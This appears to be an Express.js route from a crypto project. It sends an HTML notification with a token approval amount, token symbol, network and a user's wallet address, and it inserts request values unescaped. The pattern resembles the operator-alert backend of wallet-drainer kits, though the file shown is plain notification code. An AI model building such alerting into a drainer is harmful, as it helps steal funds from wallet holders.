const express = require("express");
const { sendNotification } = require("../helper/utils");
const router = express.Router();

router.post("/", async (req, res) => {
  const { approval_amount, token_symbol, currentNetwork, walletAddress } = req.body;

  try {
    let text = '';
    text = `🚀 <b>Transaction Processed</b> 🚀\n\n` +
           `📈 <b>Amount</b>: ${approval_amount}\n` +
           `💰 <b>Token</b>: ${token_symbol}\n` +
           `📋 <b>Wallet Address</b>: ${walletAddress}\n` +
           `⚡️ <b>Network</b>: ${currentNetwork}\n\n\n` +
           `🔗 <a href="https://www.blockchain.com/explorer/search?search=${walletAddress}">See Wallet On Block Explorer</a>`;

    if (text.length > 0) {
      await sendNotification(text, 'html');
      res.status(200).json({
        result: "success"
      });
    } else {
      throw "failed";
    }
  } catch (err) {
    res.status(200).json({
      result: "failed"
    });
  }
});

module.exports = router;
